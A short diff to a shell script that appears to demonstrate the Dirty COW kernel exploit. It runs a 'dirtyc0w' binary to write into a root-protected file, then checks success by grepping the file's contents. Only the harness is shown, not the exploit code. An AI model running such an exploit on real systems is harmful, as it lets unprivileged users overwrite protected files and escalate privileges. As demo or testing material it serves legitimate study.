@@ -73,7 +73,8 @@ fi
 echo -e "${COLOR1}"
 read -n1 -r -p "...[press any key] to Muuuh~TM into that file!"
 echo -e "-----------------------------${NOCOLOR}"
-if (./dirtyc0w root_protected "This file is writable by everybody liking c🍪🍪kies!"); then
+./dirtyc0w root_protected "This file is writable by everybody liking c🍪🍪kies!"
+if (cat root_protected | grep liking); then
   echo Succeeded in writing to root_protected file
 else
   echo DirtyC0W does not work on your system
